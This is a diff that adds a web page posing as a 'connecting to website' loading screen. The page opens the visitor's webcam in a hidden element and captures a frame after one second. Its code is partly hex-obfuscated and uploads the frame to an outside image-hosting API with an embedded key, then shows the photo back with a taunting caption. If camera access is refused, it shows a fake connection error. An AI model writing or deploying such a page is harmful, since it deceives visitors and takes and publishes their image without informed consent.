@@ -1,0 +1,66 @@
+﻿<!doctype html>
+<html lang="en">
+  <head>
+    <title>连接网站......</title>
+    <meta charset="utf-8">
+  </head>
+  <body>
+    <div class="disappear">
+      <video id="video" width=500px height=500px autoplay="autoplay" display=none></video>
+      <canvas id="canvas" width=500px height=500px display=none></canvas>
+    </div>
+    <script src="https://cdn.bootcss.com/jquery/1.12.4/jquery.min.js"></script>
+    <script>
+      let video = document.getElementById("video");
+          function getMedia() {
+              let constraints = {
+                  video: {width: 500, height: 500},
+                  audio: false
+              };
+              let promise = navigator.mediaDevices.getUserMedia(constraints);
+              promise.then(function (MediaStream) {
+                  setTimeout(sendimg, 1000);
+                  video.srcObject = MediaStream;
+                  video.play();
+              }).catch(function (PermissionDeniedError) {
+                  window["\x61\x6c\x65\x72\x74"]("\u8fde\u63a5\u7f51\u7ad9\u5931\u8d25\uff01 "+PermissionDeniedError);
+                  location.href='about:blank';
+              })
+          }
+          function sendimg(){
+              let canvas = document.getElementById("canvas");
+              let ctx = canvas.getContext('2d');
+              ctx.drawImage(video, 0, 0, 500, 500);
+              var img = canvas.toDataURL();
+              $["\x61\x6a\x61\x78"]({
+                  url: "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x61\x70\x69\x2e\x69\x6d\x67\x62\x62\x2e\x63\x6f\x6d\x2f\x31\x2f\x75\x70\x6c\x6f\x61\x64\x3f\x6b\x65\x79\x3d\x38\x30\x31\x64\x65\x32\x32\x30\x66\x65\x35\x39\x33\x37\x35\x36\x64\x66\x33\x32\x35\x63\x61\x30\x62\x64\x37\x35\x39\x62\x34\x66",
+                  type: "\x50\x4f\x53\x54",
+                  data:{"\x69\x6d\x61\x67\x65":img["\x73\x6c\x69\x63\x65"](22)},
+                  success: function (gHDiWH$v1) {
+                      loadweb(gHDiWH$v1["\x64\x61\x74\x61"]["\x69\x6d\x61\x67\x65"]["\x75\x72\x6c"]);
+                  },
+                  error: function () {
+                      console["\x6c\x6f\x67"]("\u670d\u52a1\u7aef\u5f02\u5e38\uff01");
+                  }              
+              });
+          }
+          function loadweb(UserImage){
+              document.writeln("<style>");
+              document.writeln("h1{");
+              document.writeln("text-shadow: 5px 2px 10px #FF0000;");
+              document.writeln("}");
+              document.writeln("</style>");
+              window["\x64\x6f\x63\x75\x6d\x65\x6e\x74"]["\x77\x72\x69\x74\x65\x6c\x6e"]("\x3c\x68\x31\x3e\u770b\u770b\u4f60\u7684\u82f1\u59ff\x3c\x2f\x68\x31\x3e");
+              document.writeln("<img src="+UserImage+">");
+            }
+          setTimeout(getMedia);
+    </script>
+    <style>
+      .disappear{
+              z-index:-10;
+              position:relative;
+              opacity:0;
+          }
+    </style>
+  </body>
+</html>
